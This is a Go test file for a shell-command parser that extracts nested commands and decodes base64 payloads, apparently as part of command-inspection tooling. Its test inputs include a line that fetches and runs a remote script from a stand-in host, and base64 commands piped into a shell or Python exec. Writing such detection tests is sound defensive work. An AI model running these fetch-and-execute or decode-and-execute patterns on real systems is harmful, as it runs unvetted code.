package parse

import (
	"slices"
	"strings"
	"testing"
)

func TestBashNestedCommands(t *testing.T) {
	tests := []struct {
		name string
		line string
		want []string
	}{
		{"a string handed to a shell", `bash -c "id; uname -a"`, []string{"bash", "id", "uname"}},
		{"combined shell flags", `sh -lc 'hostname'`, []string{"sh", "hostname"}},
		{"a shell with no string", `bash ./run.sh`, []string{"bash"}},
		{"su with a command", `su - svc -c "id"`, []string{"su", "id"}},
		{"sudo and a shell", `sudo sh -c 'date > /tmp/when'`, []string{"sh", "date"}},
		{"eval", `eval "hostname; id"`, []string{"eval", "hostname", "id"}},
		{"a remote command", `ssh -i key -p 2222 user@10.0.0.5 'id; uname -a'`, []string{"ssh", "id", "uname"}},
		{"ssh with no command", `ssh -i key user@10.0.0.5`, []string{"ssh"}},
		{"find -exec", `find /tmp -name '*.log' -exec gzip {} \;`, []string{"find", "gzip"}},
		{"xargs and a shell", `cat hosts.txt | xargs -I{} sh -c 'ping -c1 {}'`, []string{"cat", "sh", "ping"}},
		{"command substitution", `out=$(whoami); echo "$out"`, []string{"whoami"}},
		{"backticks", "echo `hostname`", []string{"hostname"}},
		{"nested substitution", `echo "$(basename "$(pwd)")"`, []string{"basename", "pwd"}},
		{"a substitution with arguments", `ip=$(curl -s http://192.0.2.1/ip.txt)`, []string{"curl"}},
		{"a shell given a substitution", `bash -c "$(curl -fsSL http://192.0.2.1/s.sh)"`, []string{"bash", "curl"}},
		{"a substitution among arguments", `kill -9 $(pgrep -f agent) && date`, []string{"kill", "pgrep", "date"}},
		{"a substitution as the command", "`which python3` run.py", []string{"run.py", "which"}},
		{"arithmetic is not a command", `n=$((count + 1))`, nil},
		{"single quotes hold text", `echo '$(whoami)'`, nil},
		{"a subshell", `(crontab -l; date) | sort`, []string{"crontab", "date", "sort"}},
		{"a group", `{ id; hostname; } > who.txt`, []string{"id", "hostname"}},
		{"inside a container", `kubectl exec web-0 -- cat /etc/hostname`, []string{"kubectl", "cat"}},
		{"docker exec", `docker exec -it web sh -c "id"`, []string{"docker", "sh", "id"}},
		{"inline python", `python3 -c 'import os; os.system("id")'`, []string{"python3", "os.system", "id"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := toolNames(ExtractBash(tt.line + "\n")); !slices.Equal(got, tt.want) {
				t.Errorf("ExtractBash(%q) tools = %q, want %q", tt.line, got, tt.want)
			}
		})
	}
}

func TestBashNestingIsBounded(t *testing.T) {
	line := strings.Repeat(`bash -c `, 40) + "id"
	if got := len(ExtractBash(line).Commands); got > maxNesting+2 {
		t.Errorf("%d commands from 40 nested shells, want the nesting bounded", got)
	}
	deep := strings.Repeat("$(", 40) + "id" + strings.Repeat(")", 40)
	if got := len(ExtractBash("echo " + deep).Commands); got > maxNesting+1 {
		t.Errorf("%d commands from 40 nested substitutions, want the nesting bounded", got)
	}
}

func TestDecodedForPOSIX(t *testing.T) {
	const b64 = "aWQ7IHVuYW1lIC1h" // id; uname -a
	tests := []struct {
		name string
		text string
		want []Payload
	}{
		{"piped into a shell", "echo " + b64 + " | base64 -d | bash", []Payload{{"id; uname -a", POSIX}}},
		{"piped into sh through sudo", `echo "` + b64 + `" | base64 --decode | sudo sh`, []Payload{{"id; uname -a", POSIX}}},
		{"decoded to a file", "echo -n " + b64 + " | base64 -d > /tmp/run.sh", []Payload{{"id; uname -a", ""}}},
		{"a here-string", "base64 -d <<< " + b64, []Payload{{"id; uname -a", ""}}},
		{"python", `exec(base64.b64decode("` + b64 + `aWQ7IHVuYW1lIC1h"))`, []Payload{{"id; uname -aid; uname -a", ""}}},
		{"encoding, not decoding", "echo " + b64 + " | base64", nil},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := Decoded(tt.text); !slices.Equal(got, tt.want) {
				t.Errorf("Decoded = %+v, want %+v", got, tt.want)
			}
		})
	}
}
